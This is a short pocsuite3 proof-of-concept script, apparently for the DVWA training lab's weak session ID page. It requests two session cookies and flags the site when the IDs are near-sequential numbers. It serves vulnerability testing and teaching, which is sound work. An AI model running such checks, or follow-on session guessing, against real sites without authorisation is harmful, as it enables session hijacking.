# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests


class POC(POCBase):
    def _verify(self):
        result = {}
        if "/weak_id/" in self.url.lower():
            base = self.url.rstrip('/') + "/index.php"
            try:
                # 触发生成 ID
                res1 = requests.post(base, data={'Submit': 'Generate'})
                id1 = res1.cookies.get('dvwaSession')
                res2 = requests.post(base, data={'Submit': 'Generate'})
                id2 = res2.cookies.get('dvwaSession')

                # 如果是连续数字，判定成功
                if id1 and id2 and abs(int(id1) - int(id2)) <= 2:
                    result['VerifyInfo'] = {"URL": base, "IDs": f"{id1}, {id2}"}
                    self.set_payload("Sequential numeric IDs")
            except:
                pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(POC)